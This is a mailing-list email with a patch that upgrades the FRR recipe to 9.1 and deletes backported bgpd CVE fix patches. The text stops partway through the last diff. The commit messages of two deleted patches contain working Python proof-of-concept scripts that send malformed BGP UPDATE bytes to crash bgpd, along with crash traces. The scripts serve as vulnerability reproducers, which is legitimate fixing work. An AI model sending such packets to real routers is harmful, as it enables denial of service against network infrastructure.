Return-Path: <wangmy@fujitsu.com>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from aws-us-west-2-korg-lkml-1.web.codeaurora.org (localhost.localdomain [127.0.0.1])
	by smtp.lore.kernel.org (Postfix) with ESMTP id B3C7CC4167B
	for <webhook@archiver.kernel.org>; Tue, 28 Nov 2023 08:18:54 +0000 (UTC)
Received: from esa4.hc1455-7.c3s2.iphmx.com (esa4.hc1455-7.c3s2.iphmx.com [68.232.139.117])
 by mx.groups.io with SMTP id smtpd.web11.28244.1701159532191474233
 for <openembedded-devel@lists.openembedded.org>;
 Tue, 28 Nov 2023 00:18:52 -0800
Authentication-Results: mx.groups.io;
 dkim=none (message not signed); spf=pass (domain: fujitsu.com, ip: 68.232.139.117, mailfrom: wangmy@fujitsu.com)
X-IronPort-AV: E=McAfee;i="6600,9927,10907"; a="141438809"
X-IronPort-AV: E=Sophos;i="6.04,233,1695654000"; 
   d="scan'208";a="141438809"
Received: from unknown (HELO oym-r1.gw.nic.fujitsu.com) ([210.162.30.89])
  by esa4.hc1455-7.c3s2.iphmx.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384; 28 Nov 2023 17:18:49 +0900
Received: from oym-m1.gw.nic.fujitsu.com (oym-nat-oym-m1.gw.nic.fujitsu.com [192.168.87.58])
	by oym-r1.gw.nic.fujitsu.com (Postfix) with ESMTP id 29CB1E74F0
	for <openembedded-devel@lists.openembedded.org>; Tue, 28 Nov 2023 17:18:47 +0900 (JST)
Received: from aks-ab1.gw.nic.fujitsu.com (aks-ab1.gw.nic.fujitsu.com [192.51.207.11])
	by oym-m1.gw.nic.fujitsu.com (Postfix) with ESMTP id 2441AD88AA
	for <openembedded-devel@lists.openembedded.org>; Tue, 28 Nov 2023 17:18:46 +0900 (JST)
Received: from vm4860.g01.fujitsu.local (unknown [10.193.128.149])
	by aks-ab2.gw.nic.fujitsu.com (Postfix) with ESMTP id C01558418A;
	Tue, 28 Nov 2023 17:18:44 +0900 (JST)
From: wangmy@fujitsu.com
To: openembedded-devel@lists.openembedded.org
Cc: Wang Mingyu <wangmy@fujitsu.com>
Subject: [oe] [meta-networking] [PATCH] frr: upgrade 9.0.1 -> 9.1
Date: Tue, 28 Nov 2023 16:18:03 +0800
Message-Id: <1701159483-27786-1-git-send-email-wangmy@fujitsu.com>
X-Mailer: git-send-email 1.8.3.1
X-TM-AS-GCONF: 00
X-TM-AS-Product-Ver: IMSS-9.1.0.1408-9.0.0.1002-28024.006
X-TM-AS-User-Approved-Sender: Yes
X-TMASE-Version: IMSS-9.1.0.1408-9.0.1002-28024.006
X-TMASE-Result: 10--3.374000-10.000000
X-TMASE-MatchedRID: xHArK2ENf+2jz0nOeth/ycaw71DJbaIEkdS3kPlaZyWhLh9e7qvSIrvp
	aegzCez+KqrQ7lLcMnwt/DPtuO0OwdzZGrP764sO/HTKStsDGMJyGvikEsYi8AfxTM57BPHDvwU
	evDt+uW40gGvDuBPXdC//MlDRqI8m9R7dwXny/bcdZEkR8Y/meZKLNrbpy/A0shUUKa5wa6WQpV
	bkels4WVuCtXX/O3LisWtKN35s0wIiXL+V+zm5iaoXHZz/dXlxG24YVeuZGmNH40dCFCRCgM3r9
	izOHa+2FnrnG5LOkLZjcYh877uI7cNelmCl8nZMoGwJKRc7e7unRzlrI6byg4pLyz8UyqY4jXo1
	v7B3XhCx/rIQkjoLGuldDrDAWK+s+ns5hmhvrIoOWDFvyz6vQPG6GRFYrbYYyBXJN3+n78jUwcT
	VkFUWnwFw7SRknYrihPHiBtmDXJFeA+RlgOH8zBBjql00WXAfGEGBUNvh8GChUoducQu06TK2ie
	u8M5yxTZNQaLpf+7gVSnESq9y1Uq1UpJChTZPB5jpYq8oRllNvrcC8cqLKod7ISTxVNEA1Yxa8w
	xTbhnslCnYWg+G2fCGNjZiLYHbQvBVg4IU4e9m628cXbnOhT0MhR1xihLSDACF5TKaad18fYVX9
	DjB9xJ9l/ovCTeAib4Iu8Jy/32CCrAvdroZEJgXtykVcrvpNM9EkAUzyluFs98Z8fG/6kXqTKrT
	4kCRpgD75GVEIAu62J4OybX9FbW00sCPwNg7wm49wWx9Ii7T+yhO1yCoLfLRPJs/q8vyUIY6e+X
	i1ah8X0jceDJtHITKHYLsR4q0LHxPMjOKY7A9t1O49r1VEa8RB0bsfrpPIqxB32o9eGckEk6EA2
	fQKIpYF+WsbGu6V+6bYyy1gKrCefCe8ifL49+TME2ul3H46Wx4TP8nQnOhtuu4v7kQNXMWLmpFw
	sKJ3VvA8EDqLV6+g33WVKhDanvIMFg0InOPqz5gAnmajvOU4qCidlj1MUy0uABDi47cA
X-TMASE-SNAP-Result: 1.821001.0001-0-1-22:0,33:0,34:0-0
List-Id: <openembedded-devel.lists.openembedded.org>
X-Webhook-Received: from li982-79.members.linode.com [45.33.32.79] by
 aws-us-west-2-korg-lkml-1.web.codeaurora.org with HTTPS for
 <openembedded-devel@lists.openembedded.org>; Tue, 28 Nov 2023 08:18:54 -0000
X-Groupsio-URL: https://lists.openembedded.org/g/openembedded-devel/message/107072

From: Wang Mingyu <wangmy@fujitsu.com>

0001-tools-make-quiet-actually-suppress-output.patch
CVE-2023-46752.patch
CVE-2023-46753.patch
CVE-2023-47234.patch
CVE-2023-47235.patch
removed since they're included in 9.1

Signed-off-by: Wang Mingyu <wangmy@fujitsu.com>
---
 ...-make-quiet-actually-suppress-output.patch |  58 --------
 .../frr/frr/CVE-2023-46752.patch              | 125 ------------------
 .../frr/frr/CVE-2023-46753.patch              | 117 ----------------
 .../frr/frr/CVE-2023-47234.patch              |  95 -------------
 .../frr/frr/CVE-2023-47235.patch              | 112 ----------------
 .../frr/{frr_9.0.1.bb => frr_9.1.bb}          |   9 +-
 6 files changed, 2 insertions(+), 514 deletions(-)
 delete mode 100644 meta-networking/recipes-protocols/frr/frr/0001-tools-make-quiet-actually-suppress-output.patch
 delete mode 100644 meta-networking/recipes-protocols/frr/frr/CVE-2023-46752.patch
 delete mode 100644 meta-networking/recipes-protocols/frr/frr/CVE-2023-46753.patch
 delete mode 100644 meta-networking/recipes-protocols/frr/frr/CVE-2023-47234.patch
 delete mode 100644 meta-networking/recipes-protocols/frr/frr/CVE-2023-47235.patch
 rename meta-networking/recipes-protocols/frr/{frr_9.0.1.bb => frr_9.1.bb} (94%)

diff --git a/meta-networking/recipes-protocols/frr/frr/0001-tools-make-quiet-actually-suppress-output.patch b/meta-networking/recipes-protocols/frr/frr/0001-tools-make-quiet-actually-suppress-output.patch
deleted file mode 100644
index 3e93cf3c4..000000000
--- a/meta-networking/recipes-protocols/frr/frr/0001-tools-make-quiet-actually-suppress-output.patch
+++ /dev/null
@@ -1,58 +0,0 @@
-From 312d5ee1592f8c5b616d330233d1de2643f759e2 Mon Sep 17 00:00:00 2001
-From: Jonas Gorski <jonas.gorski@bisdn.de>
-Date: Thu, 14 Sep 2023 17:04:16 +0200
-Subject: [PATCH] tools: make --quiet actually suppress output
-
-When calling daemon_stop() with --quiet and e.g. the pidfile is empty,
-it won't return early since while "$fail" is set, "$2" is "--quiet", so
-the if condition isn't met and it will continue executing, resulting
-in error messages in the log:
-
-> Sep 14 14:48:33 localhost watchfrr[2085]: [YFT0P-5Q5YX] Forked background command [pid 2086]: /usr/lib/frr/watchfrr.sh restart all
-> Sep 14 14:48:33 localhost frrinit.sh[2075]: /usr/lib/frr/frrcommon.sh: line 216: kill: `': not a pid or valid job spec
-> Sep 14 14:48:33 localhost frrinit.sh[2075]: /usr/lib/frr/frrcommon.sh: line 216: kill: `': not a pid or valid job spec
-> Sep 14 14:48:33 localhost frrinit.sh[2075]: /usr/lib/frr/frrcommon.sh: line 216: kill: `': not a pid or valid job spec
-
-Fix this by moving the --quiet check into the block to log_failure_msg(),
-and also add the check to all other invocations of log_*_msg() to make
---quiet properly suppress output.
-
-Fixes: 19a99d89f088 ("tools: suppress unuseful warnings during restarting frr")
-Signed-off-by: Jonas Gorski <jonas.gorski@bisdn.de>
-Upstream-Status: Backport [https://github.com/FRRouting/frr/commit/312d5ee1592f8c5b616d330233d1de2643f759e2]
----
- tools/frrcommon.sh.in | 8 ++++----
- 1 file changed, 4 insertions(+), 4 deletions(-)
-
-diff --git a/tools/frrcommon.sh.in b/tools/frrcommon.sh.in
-index f1f70119097e..00b63a78e2bc 100755
---- a/tools/frrcommon.sh.in
-+++ b/tools/frrcommon.sh.in
-@@ -207,8 +207,8 @@ daemon_stop() {
- 	[ -z "$fail" -a -z "$pid" ] && fail="pid file is empty"
- 	[ -n "$fail" ] || kill -0 "$pid" 2>/dev/null || fail="pid $pid not running"
- 
--	if [ -n "$fail" ] && [ "$2" != "--quiet" ]; then
--		log_failure_msg "Cannot stop $dmninst: $fail"
-+	if [ -n "$fail" ]; then
-+		[ "$2" = "--quiet" ] || log_failure_msg "Cannot stop $dmninst: $fail"
- 		return 1
- 	fi
- 
-@@ -220,11 +220,11 @@ daemon_stop() {
- 		[ $(( cnt -= 1 )) -gt 0 ] || break
- 	done
- 	if kill -0 "$pid" 2>/dev/null; then
--		log_failure_msg "Failed to stop $dmninst, pid $pid still running"
-+		[ "$2" = "--quiet" ] || log_failure_msg "Failed to stop $dmninst, pid $pid still running"
- 		still_running=1
- 		return 1
- 	else
--		log_success_msg "Stopped $dmninst"
-+		[ "$2" = "--quiet" ] || log_success_msg "Stopped $dmninst"
- 		rm -f "$pidfile"
- 		return 0
- 	fi
--- 
-2.42.0
-
diff --git a/meta-networking/recipes-protocols/frr/frr/CVE-2023-46752.patch b/meta-networking/recipes-protocols/frr/frr/CVE-2023-46752.patch
deleted file mode 100644
index e1f30248c..000000000
--- a/meta-networking/recipes-protocols/frr/frr/CVE-2023-46752.patch
+++ /dev/null
@@ -1,125 +0,0 @@
-From b08afc81c60607a4f736f418f2e3eb06087f1a35 Mon Sep 17 00:00:00 2001
-From: Donatas Abraitis <donatas@opensourcerouting.org>
-Date: Fri, 20 Oct 2023 17:49:18 +0300
-Subject: [PATCH] bgpd: Handle MP_REACH_NLRI malformed packets with session
- reset
-
-Avoid crashing bgpd.
-
-```
-(gdb)
-bgp_mp_reach_parse (args=<optimized out>, mp_update=0x7fffffffe140) at bgpd/bgp_attr.c:2341
-2341			stream_get(&attr->mp_nexthop_global, s, IPV6_MAX_BYTELEN);
-(gdb)
-stream_get (dst=0x7fffffffe1ac, s=0x7ffff0006e80, size=16) at lib/stream.c:320
-320	{
-(gdb)
-321		STREAM_VERIFY_SANE(s);
-(gdb)
-323		if (STREAM_READABLE(s) < size) {
-(gdb)
-34	  return __builtin___memcpy_chk (__dest, __src, __len, __bos0 (__dest));
-(gdb)
-
-Thread 1 "bgpd" received signal SIGSEGV, Segmentation fault.
-0x00005555556e37be in route_set_aspath_prepend (rule=0x555555aac0d0, prefix=0x7fffffffe050,
-    object=0x7fffffffdb00) at bgpd/bgp_routemap.c:2282
-2282		if (path->attr->aspath->refcnt)
-(gdb)
-```
-
-With the configuration:
-
-```
- neighbor 127.0.0.1 remote-as external
- neighbor 127.0.0.1 passive
- neighbor 127.0.0.1 ebgp-multihop
- neighbor 127.0.0.1 disable-connected-check
- neighbor 127.0.0.1 update-source 127.0.0.2
- neighbor 127.0.0.1 timers 3 90
- neighbor 127.0.0.1 timers connect 1
- address-family ipv4 unicast
-  redistribute connected
-  neighbor 127.0.0.1 default-originate
-  neighbor 127.0.0.1 route-map RM_IN in
- exit-address-family
-!
-route-map RM_IN permit 10
- set as-path prepend 200
-exit
-```
-
-Reported-by: Iggy Frankovic <iggyfran@amazon.com>
-Signed-off-by: Donatas Abraitis <donatas@opensourcerouting.org>
-Upstream-Status: Backport [https://github.com/FRRouting/frr/commit/b08afc81c60607a4f736f418f2e3eb06087f1a35]
-CVE: CVE-2023-46752
-Signed-off-by: Jonas Gorski <jonas.gorski@bisdn.de>
----
- bgpd/bgp_attr.c   | 6 +-----
- bgpd/bgp_attr.h   | 1 -
- bgpd/bgp_packet.c | 6 +-----
- 3 files changed, 2 insertions(+), 11 deletions(-)
-
-diff --git a/bgpd/bgp_attr.c b/bgpd/bgp_attr.c
-index 6925aff727e2..e7bb42a5d989 100644
---- a/bgpd/bgp_attr.c
-+++ b/bgpd/bgp_attr.c
-@@ -2421,7 +2421,7 @@ int bgp_mp_reach_parse(struct bgp_attr_parser_args *args,
- 
- 		mp_update->afi = afi;
- 		mp_update->safi = safi;
--		return BGP_ATTR_PARSE_EOR;
-+		return bgp_attr_malformed(args, BGP_NOTIFY_UPDATE_MAL_ATTR, 0);
- 	}
- 
- 	mp_update->afi = afi;
-@@ -3759,10 +3759,6 @@ enum bgp_attr_parse_ret bgp_attr_parse(struct peer *peer, struct attr *attr,
- 			goto done;
- 		}
- 
--		if (ret == BGP_ATTR_PARSE_EOR) {
--			goto done;
--		}
--
- 		if (ret == BGP_ATTR_PARSE_ERROR) {
- 			flog_warn(EC_BGP_ATTRIBUTE_PARSE_ERROR,
- 				  "%s: Attribute %s, parse error", peer->host,
-diff --git a/bgpd/bgp_attr.h b/bgpd/bgp_attr.h
-index 961e5f122470..fc347e7a1b4b 100644
---- a/bgpd/bgp_attr.h
-+++ b/bgpd/bgp_attr.h
-@@ -364,7 +364,6 @@ enum bgp_attr_parse_ret {
- 	/* only used internally, send notify + convert to BGP_ATTR_PARSE_ERROR
- 	 */
- 	BGP_ATTR_PARSE_ERROR_NOTIFYPLS = -3,
--	BGP_ATTR_PARSE_EOR = -4,
- };
- 
- struct bpacket_attr_vec_arr;
-diff --git a/bgpd/bgp_packet.c b/bgpd/bgp_packet.c
-index b585591e2f69..5ecf343b6657 100644
---- a/bgpd/bgp_packet.c
-+++ b/bgpd/bgp_packet.c
-@@ -2397,8 +2397,7 @@ static int bgp_update_receive(struct peer_connection *connection,
- 	 * Non-MP IPv4/Unicast EoR is a completely empty UPDATE
- 	 * and MP EoR should have only an empty MP_UNREACH
- 	 */
--	if ((!update_len && !withdraw_len && nlris[NLRI_MP_UPDATE].length == 0)
--	    || (attr_parse_ret == BGP_ATTR_PARSE_EOR)) {
-+	if (!update_len && !withdraw_len && nlris[NLRI_MP_UPDATE].length == 0) {
- 		afi_t afi = 0;
- 		safi_t safi;
- 		struct graceful_restart_info *gr_info;
-@@ -2419,9 +2418,6 @@ static int bgp_update_receive(struct peer_connection *connection,
- 			   && nlris[NLRI_MP_WITHDRAW].length == 0) {
- 			afi = nlris[NLRI_MP_WITHDRAW].afi;
- 			safi = nlris[NLRI_MP_WITHDRAW].safi;
--		} else if (attr_parse_ret == BGP_ATTR_PARSE_EOR) {
--			afi = nlris[NLRI_MP_UPDATE].afi;
--			safi = nlris[NLRI_MP_UPDATE].safi;
- 		}
- 
- 		if (afi && peer->afc[afi][safi]) {
--- 
-2.42.1
-
diff --git a/meta-networking/recipes-protocols/frr/frr/CVE-2023-46753.patch b/meta-networking/recipes-protocols/frr/frr/CVE-2023-46753.patch
deleted file mode 100644
index 6bf159aba..000000000
--- a/meta-networking/recipes-protocols/frr/frr/CVE-2023-46753.patch
+++ /dev/null
@@ -1,117 +0,0 @@
-From d8482bf011cb2b173e85b65b4bf3d5061250cdb9 Mon Sep 17 00:00:00 2001
-From: Donatas Abraitis <donatas@opensourcerouting.org>
-Date: Mon, 23 Oct 2023 23:34:10 +0300
-Subject: [PATCH] bgpd: Check mandatory attributes more carefully for UPDATE
- message
-
-If we send a crafted BGP UPDATE message without mandatory attributes, we do
-not check if the length of the path attributes is zero or not. We only check
-if attr->flag is at least set or not. Imagine we send only unknown transit
-attribute, then attr->flag is always 0. Also, this is true only if graceful-restart
-capability is received.
-
-A crash:
-
-```
-bgpd[7834]: [TJ23Y-GY0RH] 127.0.0.1 Unknown attribute is received (type 31, length 16)
-bgpd[7834]: [PCFFM-WMARW] 127.0.0.1(donatas-pc) rcvd UPDATE wlen 0 attrlen 20 alen 17
-BGP[7834]: Received signal 11 at 1698089639 (si_addr 0x0, PC 0x55eefd375b4a); aborting...
-BGP[7834]: /usr/local/lib/libfrr.so.0(zlog_backtrace_sigsafe+0x6d) [0x7f3205ca939d]
-BGP[7834]: /usr/local/lib/libfrr.so.0(zlog_signal+0xf3) [0x7f3205ca9593]
-BGP[7834]: /usr/local/lib/libfrr.so.0(+0xf5181) [0x7f3205cdd181]
-BGP[7834]: /lib/x86_64-linux-gnu/libpthread.so.0(+0x12980) [0x7f3204ff3980]
-BGP[7834]: /usr/lib/frr/bgpd(+0x18ab4a) [0x55eefd375b4a]
-BGP[7834]: /usr/local/lib/libfrr.so.0(route_map_apply_ext+0x310) [0x7f3205cd1290]
-BGP[7834]: /usr/lib/frr/bgpd(+0x163610) [0x55eefd34e610]
-BGP[7834]: /usr/lib/frr/bgpd(bgp_update+0x9a5) [0x55eefd35c1d5]
-BGP[7834]: /usr/lib/frr/bgpd(bgp_nlri_parse_ip+0xb7) [0x55eefd35e867]
-BGP[7834]: /usr/lib/frr/bgpd(+0x1555e6) [0x55eefd3405e6]
-BGP[7834]: /usr/lib/frr/bgpd(bgp_process_packet+0x747) [0x55eefd345597]
-BGP[7834]: /usr/local/lib/libfrr.so.0(event_call+0x83) [0x7f3205cef4a3]
-BGP[7834]: /usr/local/lib/libfrr.so.0(frr_run+0xc0) [0x7f3205ca10a0]
-BGP[7834]: /usr/lib/frr/bgpd(main+0x409) [0x55eefd2dc979]
-```
-
-Sending:
-
-```
-import socket
-import time
-
-OPEN = (b"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
-b"\xff\xff\x00\x62\x01\x04\xfd\xea\x00\x5a\x0a\x00\x00\x01\x45\x02"
-b"\x06\x01\x04\x00\x01\x00\x01\x02\x02\x02\x00\x02\x02\x46\x00\x02"
-b"\x06\x41\x04\x00\x00\xfd\xea\x02\x02\x06\x00\x02\x06\x45\x04\x00"
-b"\x01\x01\x03\x02\x0e\x49\x0c\x0a\x64\x6f\x6e\x61\x74\x61\x73\x2d"
-b"\x70\x63\x00\x02\x04\x40\x02\x00\x78\x02\x09\x47\x07\x00\x01\x01"
-b"\x80\x00\x00\x00")
-
-KEEPALIVE = (b"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
-b"\xff\xff\xff\xff\xff\xff\x00\x13\x04")
-
-UPDATE = bytearray.fromhex("ffffffffffffffffffffffffffffffff003c0200000014ff1f001000040146464646460004464646464646664646f50d05800100010200ffff000000")
-
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(('127.0.0.2', 179))
-s.send(OPEN)
-data = s.recv(1024)
-s.send(KEEPALIVE)
-data = s.recv(1024)
-s.send(UPDATE)
-data = s.recv(1024)
-time.sleep(1000)
-s.close()
-```
-
-Reported-by: Iggy Frankovic <iggyfran@amazon.com>
-Signed-off-by: Donatas Abraitis <donatas@opensourcerouting.org>
-Upstream-Status: Backport [https://github.com/FRRouting/frr/commit/d8482bf011cb2b173e85b65b4bf3d5061250cdb9]
-CVE: CVE-2023-46753
-Signed-off-by: Jonas Gorski <jonas.gorski@bisdn.de>
----
- bgpd/bgp_attr.c | 10 ++++++----
- 1 file changed, 6 insertions(+), 4 deletions(-)
-
-diff --git a/bgpd/bgp_attr.c b/bgpd/bgp_attr.c
-index e7bb42a5d989..cf2dbe65b805 100644
---- a/bgpd/bgp_attr.c
-+++ b/bgpd/bgp_attr.c
-@@ -3385,13 +3385,15 @@ bgp_attr_unknown(struct bgp_attr_parser_args *args)
- }
- 
- /* Well-known attribute check. */
--static int bgp_attr_check(struct peer *peer, struct attr *attr)
-+static int bgp_attr_check(struct peer *peer, struct attr *attr,
-+			  bgp_size_t length)
- {
- 	uint8_t type = 0;
- 
- 	/* BGP Graceful-Restart End-of-RIB for IPv4 unicast is signaled as an
- 	 * empty UPDATE.  */
--	if (CHECK_FLAG(peer->cap, PEER_CAP_RESTART_RCV) && !attr->flag)
-+	if (CHECK_FLAG(peer->cap, PEER_CAP_RESTART_RCV) && !attr->flag &&
-+	    !length)
- 		return BGP_ATTR_PARSE_PROCEED;
- 
- 	/* "An UPDATE message that contains the MP_UNREACH_NLRI is not required
-@@ -3443,7 +3445,7 @@ enum bgp_attr_parse_ret bgp_attr_parse(struct peer *peer, struct attr *attr,
- 	enum bgp_attr_parse_ret ret;
- 	uint8_t flag = 0;
- 	uint8_t type = 0;
--	bgp_size_t length;
-+	bgp_size_t length = 0;
- 	uint8_t *startp, *endp;
- 	uint8_t *attr_endp;
- 	uint8_t seen[BGP_ATTR_BITMAP_SIZE];
-@@ -3831,7 +3833,7 @@ enum bgp_attr_parse_ret bgp_attr_parse(struct peer *peer, struct attr *attr,
- 	}
- 
- 	/* Check all mandatory well-known attributes are present */
--	ret = bgp_attr_check(peer, attr);
-+	ret = bgp_attr_check(peer, attr, length);
- 	if (ret < 0)
- 		goto done;
- 
--- 
-2.42.1
-
diff --git a/meta-networking/recipes-protocols/frr/frr/CVE-2023-47234.patch b/meta-networking/recipes-protocols/frr/frr/CVE-2023-47234.patch
deleted file mode 100644
index 754f9345a..000000000
--- a/meta-networking/recipes-protocols/frr/frr/CVE-2023-47234.patch
+++ /dev/null
@@ -1,95 +0,0 @@
-From c37119df45bbf4ef713bc10475af2ee06e12f3bf Mon Sep 17 00:00:00 2001
-From: Donatas Abraitis <donatas@opensourcerouting.org>
-Date: Sun, 29 Oct 2023 22:44:45 +0200
-Subject: [PATCH] bgpd: Ignore handling NLRIs if we received MP_UNREACH_NLRI
-
-If we receive MP_UNREACH_NLRI, we should stop handling remaining NLRIs if
-no mandatory path attributes received.
-
-In other words, if MP_UNREACH_NLRI received, the remaining NLRIs should be handled
-as a new data, but without mandatory attributes, it's a malformed packet.
-
-In normal case, this MUST not happen at all, but to avoid crashing bgpd, we MUST
-handle that.
-
-Reported-by: Iggy Frankovic <iggyfran@amazon.com>
-Signed-off-by: Donatas Abraitis <donatas@opensourcerouting.org>
-Upstream-Status: Backport [https://github.com/FRRouting/frr/commit/c37119df45bbf4ef713bc10475af2ee06e12f3bf]
-CVE: CVE-2023-47234
-Signed-off-by: Jonas Gorski <jonas.gorski@bisdn.de>
----
- bgpd/bgp_attr.c   | 19 ++++++++++---------
- bgpd/bgp_attr.h   |  1 +
- bgpd/bgp_packet.c |  7 ++++++-
- 3 files changed, 17 insertions(+), 10 deletions(-)
-
-diff --git a/bgpd/bgp_attr.c b/bgpd/bgp_attr.c
-index 1473dc772502..75aa2ac7cce6 100644
---- a/bgpd/bgp_attr.c
-+++ b/bgpd/bgp_attr.c
-@@ -3399,15 +3399,6 @@ static int bgp_attr_check(struct peer *peer, struct attr *attr,
- 	    !length)
- 		return BGP_ATTR_PARSE_WITHDRAW;
- 
--	/* "An UPDATE message that contains the MP_UNREACH_NLRI is not required
--	   to carry any other path attributes.", though if MP_REACH_NLRI or NLRI
--	   are present, it should.  Check for any other attribute being present
--	   instead.
--	 */
--	if ((!CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_MP_REACH_NLRI)) &&
--	     CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_MP_UNREACH_NLRI))))
--		return BGP_ATTR_PARSE_PROCEED;
--
- 	if (!CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_ORIGIN)))
- 		type = BGP_ATTR_ORIGIN;
- 
-@@ -3426,6 +3417,16 @@ static int bgp_attr_check(struct peer *peer, struct attr *attr,
- 	    && !CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_LOCAL_PREF)))
- 		type = BGP_ATTR_LOCAL_PREF;
- 
-+	/* An UPDATE message that contains the MP_UNREACH_NLRI is not required
-+	 * to carry any other path attributes. Though if MP_REACH_NLRI or NLRI
-+	 * are present, it should. Check for any other attribute being present
-+	 * instead.
-+	 */
-+	if (!CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_MP_REACH_NLRI)) &&
-+	    CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_MP_UNREACH_NLRI)))
-+		return type ? BGP_ATTR_PARSE_MISSING_MANDATORY
-+			    : BGP_ATTR_PARSE_PROCEED;
-+
- 	/* If any of the well-known mandatory attributes are not present
- 	 * in an UPDATE message, then "treat-as-withdraw" MUST be used.
- 	 */
-diff --git a/bgpd/bgp_attr.h b/bgpd/bgp_attr.h
-index fc347e7a1b4b..d30155e6dba0 100644
---- a/bgpd/bgp_attr.h
-+++ b/bgpd/bgp_attr.h
-@@ -364,6 +364,7 @@ enum bgp_attr_parse_ret {
- 	/* only used internally, send notify + convert to BGP_ATTR_PARSE_ERROR
- 	 */
- 	BGP_ATTR_PARSE_ERROR_NOTIFYPLS = -3,
-+	BGP_ATTR_PARSE_MISSING_MANDATORY = -4,
- };
- 
- struct bpacket_attr_vec_arr;
-diff --git a/bgpd/bgp_packet.c b/bgpd/bgp_packet.c
-index a7514a26aa64..5dc35157ebf6 100644
---- a/bgpd/bgp_packet.c
-+++ b/bgpd/bgp_packet.c
-@@ -2359,7 +2359,12 @@ static int bgp_update_receive(struct peer_connection *connection,
- 	/* Network Layer Reachability Information. */
- 	update_len = end - stream_pnt(s);
- 
--	if (update_len && attribute_len) {
-+	/* If we received MP_UNREACH_NLRI attribute, but also NLRIs, then
-+	 * NLRIs should be handled as a new data. Though, if we received
-+	 * NLRIs without mandatory attributes, they should be ignored.
-+	 */
-+	if (update_len && attribute_len &&
-+	    attr_parse_ret != BGP_ATTR_PARSE_MISSING_MANDATORY) {
- 		/* Set NLRI portion to structure. */
- 		nlris[NLRI_UPDATE].afi = AFI_IP;
- 		nlris[NLRI_UPDATE].safi = SAFI_UNICAST;
--- 
-2.42.1
-
diff --git a/meta-networking/recipes-protocols/frr/frr/CVE-2023-47235.patch b/meta-networking/recipes-protocols/frr/frr/CVE-2023-47235.patch
deleted file mode 100644
index b06ba94a3..000000000
--- a/meta-networking/recipes-protocols/frr/frr/CVE-2023-47235.patch
+++ /dev/null
@@ -1,112 +0,0 @@
-From 6814f2e0138a6ea5e1f83bdd9085d9a77999900b Mon Sep 17 00:00:00 2001
-From: Donatas Abraitis <donatas@opensourcerouting.org>
-Date: Fri, 27 Oct 2023 11:56:45 +0300
-Subject: [PATCH] bgpd: Treat EOR as withdrawn to avoid unwanted handling of
- malformed attrs
-
-Treat-as-withdraw, otherwise if we just ignore it, we will pass it to be
-processed as a normal UPDATE without mandatory attributes, that could lead
-to harmful behavior. In this case, a crash for route-maps with the configuration
-such as:
-
-```
-router bgp 65001
- no bgp ebgp-requires-policy
- neighbor 127.0.0.1 remote-as external
- neighbor 127.0.0.1 passive
- neighbor 127.0.0.1 ebgp-multihop
- neighbor 127.0.0.1 disable-connected-check
- neighbor 127.0.0.1 update-source 127.0.0.2
- neighbor 127.0.0.1 timers 3 90
- neighbor 127.0.0.1 timers connect 1
- !
- address-family ipv4 unicast
-  neighbor 127.0.0.1 addpath-tx-all-paths
-  neighbor 127.0.0.1 default-originate
-  neighbor 127.0.0.1 route-map RM_IN in
- exit-address-family
-exit
-!
-route-map RM_IN permit 10
- set as-path prepend 200
-exit
-```
-
-Send a malformed optional transitive attribute:
-
-```
-import socket
-import time
-
-OPEN = (b"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
-b"\xff\xff\x00\x62\x01\x04\xfd\xea\x00\x5a\x0a\x00\x00\x01\x45\x02"
-b"\x06\x01\x04\x00\x01\x00\x01\x02\x02\x02\x00\x02\x02\x46\x00\x02"
-b"\x06\x41\x04\x00\x00\xfd\xea\x02\x02\x06\x00\x02\x06\x45\x04\x00"
-b"\x01\x01\x03\x02\x0e\x49\x0c\x0a\x64\x6f\x6e\x61\x74\x61\x73\x2d"
-b"\x70\x63\x00\x02\x04\x40\x02\x00\x78\x02\x09\x47\x07\x00\x01\x01"
-b"\x80\x00\x00\x00")
-
-KEEPALIVE = (b"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
-b"\xff\xff\xff\xff\xff\xff\x00\x13\x04")
-
-UPDATE = bytearray.fromhex("ffffffffffffffffffffffffffffffff002b0200000003c0ff00010100eb00ac100b0b001ad908ac100b0b")
-
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(('127.0.0.2', 179))
-s.send(OPEN)
-data = s.recv(1024)
-s.send(KEEPALIVE)
-data = s.recv(1024)
-s.send(UPDATE)
-data = s.recv(1024)
-time.sleep(100)
-s.close()
-```
-
-Reported-by: Iggy Frankovic <iggyfran@amazon.com>
-Signed-off-by: Donatas Abraitis <donatas@opensourcerouting.org>
-Upstream-Status: Backport [https://github.com/FRRouting/frr/commit/6814f2e0138a6ea5e1f83bdd9085d9a77999900b]
-CVE: CVE-2023-47235
-Signed-off-by: Jonas Gorski <jonas.gorski@bisdn.de>
----
- bgpd/bgp_attr.c | 15 ++++++++++++---
- 1 file changed, 12 insertions(+), 3 deletions(-)
-
-diff --git a/bgpd/bgp_attr.c b/bgpd/bgp_attr.c
-index cf2dbe65b805..1473dc772502 100644
---- a/bgpd/bgp_attr.c
-+++ b/bgpd/bgp_attr.c
-@@ -3391,10 +3391,13 @@ static int bgp_attr_check(struct peer *peer, struct attr *attr,
- 	uint8_t type = 0;
- 
- 	/* BGP Graceful-Restart End-of-RIB for IPv4 unicast is signaled as an
--	 * empty UPDATE.  */
-+	 * empty UPDATE. Treat-as-withdraw, otherwise if we just ignore it,
-+	 * we will pass it to be processed as a normal UPDATE without mandatory
-+	 * attributes, that could lead to harmful behavior.
-+	 */
- 	if (CHECK_FLAG(peer->cap, PEER_CAP_RESTART_RCV) && !attr->flag &&
- 	    !length)
--		return BGP_ATTR_PARSE_PROCEED;
